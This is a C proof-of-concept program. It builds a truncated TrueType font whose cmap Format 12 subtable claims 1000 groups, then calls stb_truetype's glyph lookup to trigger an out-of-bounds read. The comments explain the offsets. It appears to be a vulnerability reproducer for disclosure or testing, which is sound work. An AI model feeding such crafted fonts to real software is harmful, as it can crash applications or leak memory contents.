#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STB_TRUETYPE_IMPLEMENTATION
#include "../stb_truetype.h"

static void put_u16(uint8_t *p, size_t off, uint16_t v) {
   p[off] = (uint8_t)(v >> 8);
   p[off+1] = (uint8_t)(v & 0xff);
}

static void put_u32(uint8_t *p, size_t off, uint32_t v) {
   p[off] = (uint8_t)(v >> 24);
   p[off+1] = (uint8_t)(v >> 16);
   p[off+2] = (uint8_t)(v >> 8);
   p[off+3] = (uint8_t)(v & 0xff);
}

int main(void) {
   // Build a minimal TrueType font (280 bytes). The cmap table contains a
   // Format 12 subtable (Unicode Full) whose header declares 1000 groups,
   // but the subtable is truncated — no group data follows the 16-byte
   // header. The binary search in stbtt_FindGlyphIndex reads ttULONG at
   // index_map + 16 + mid*12, which is way past the buffer.
   //
   // Layout:
   //   0-11     Offset table
   //   12-123   7 table directory entries
   //   124-177  head  (54 bytes)
   //   178-213  hhea  (36 bytes)
   //   214-217  hmtx  (4 bytes)
   //   218-223  maxp  (6 bytes)
   //   224-231  loca  (8 bytes)
   //   232-251  glyf  (20 bytes)
   //   252-279  cmap  (28 bytes — header + Format 12 subtable, no groups)
   //   ^^^^^^^^ binary search reads at +6280 (way OOB)

   size_t font_size = 280;
   uint8_t *font = (uint8_t *)calloc(font_size, 1);
   if (!font) return 2;

   // --- Offset Table -------------------------------------------------------
   put_u32(font, 0, 0x00010000);
   put_u16(font, 4, 7);
   put_u16(font, 6, 64);
   put_u16(font, 8, 3);
   put_u16(font, 10, 48);

   // --- Table Directory Entries --------------------------------------------
   static const char *tags[7] = {"cmap","head","hhea","hmtx","maxp","loca","glyf"};
   static uint32_t  toff[7] = {252, 124, 178, 214, 218, 224, 232};
   static uint32_t  tlen[7] = { 28,  54,  36,   4,   6,   8,  20};
   for (int i = 0; i < 7; i++) {
      size_t base = 12 + 16 * i;
      memcpy(font + base, tags[i], 4);
      put_u32(font, base + 8, toff[i]);
      put_u32(font, base + 12, tlen[i]);
   }

   // --- head (124) ---------------------------------------------------------
   put_u32(font, 142, 0x5F0F3CF5);
   put_u16(font, 174, 1);

   // --- hhea (178) ---------------------------------------------------------
   put_u16(font, 212, 1);

   // --- hmtx (214) ---------------------------------------------------------
   put_u16(font, 214, 1024);

   // --- maxp (218) ---------------------------------------------------------
   put_u16(font, 222, 1);

   // --- loca (224) ---------------------------------------------------------
   put_u32(font, 224, 0);
   put_u32(font, 228, 20);

   // --- glyf (232) ---------------------------------------------------------
   put_u16(font, 232, 0);

   // --- cmap (252) ---------------------------------------------------------
   // cmap header
   put_u16(font, 252, 0);           // version
   put_u16(font, 254, 1);           // numTables = 1

   // encoding record (256)
   put_u16(font, 256, 3);           // platformID = Microsoft
   put_u16(font, 258, 10);          // encodingID = Unicode FULL
   put_u32(font, 260, 12);          // subtableOffset -> index_map = 252+12 = 264

   // Format 12 subtable (264) — header only, no groups
   put_u16(font, 264, 12);          // format = 12
   put_u16(font, 266, 0);           // reserved
   put_u32(font, 268, 16);          // length = 16 (header only)
   put_u32(font, 272, 0);           // language
   put_u32(font, 276, 1000);        // numGroups = 1000 — OOB read follows

   stbtt_fontinfo info;
   if (!stbtt_InitFont(&info, font, 0)) {
      printf("InitFont returned 0\n");
      free(font);
      return 0;
   }

   // This call triggers OOB ttULONG read in Format 12/13 binary search
   int glyph = stbtt_FindGlyphIndex(&info, 0x0041);
   printf("Glyph index: %d\n", glyph);
   free(font);
   return 0;
}
